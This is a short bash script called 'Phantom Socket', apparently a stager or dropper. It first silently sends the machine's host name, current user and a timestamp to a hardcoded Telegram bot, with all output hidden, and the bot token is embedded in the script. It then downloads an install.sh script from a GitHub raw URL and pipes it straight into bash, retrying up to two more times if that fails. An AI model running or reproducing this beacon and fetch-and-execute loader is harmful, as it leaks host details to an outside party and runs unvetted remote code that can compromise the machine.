#!/bin/bash
# Phantom Socket v1.0.1-stable - Raw GitHub Redirector
# (C) 2026 Oyen-Sec

# SECTION 1: TELEGRAM INSTANT PING
BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
CHAT_ID="5439698489"
MSG="OYEN_TRIGGER:$(hostname):$(whoami):$(date +%s)"
curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    -d "chat_id=${CHAT_ID}" -d "text=${MSG}" >/dev/null 2>&1

# SECTION 2: FETCH AND EXECUTE INSTALLER
# Using strictly the raw.githubusercontent.com domain for stability.
REPO_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh"

MAX_RETRIES=2
RETRY_COUNT=0
while [[ $RETRY_COUNT -le $MAX_RETRIES ]]; do
    if curl -fsSL --max-time 30 "${REPO_URL}" | bash -s -- "$@"; then
        exit 0
    fi
    RETRY_COUNT=$((RETRY_COUNT+1))
    if [[ $RETRY_COUNT -le $MAX_RETRIES ]]; then
        echo "[!] Download failed. Retrying..." >&2
        sleep 2
    fi
done

echo "[!] Critical: Could not reach the repository." >&2
exit 1
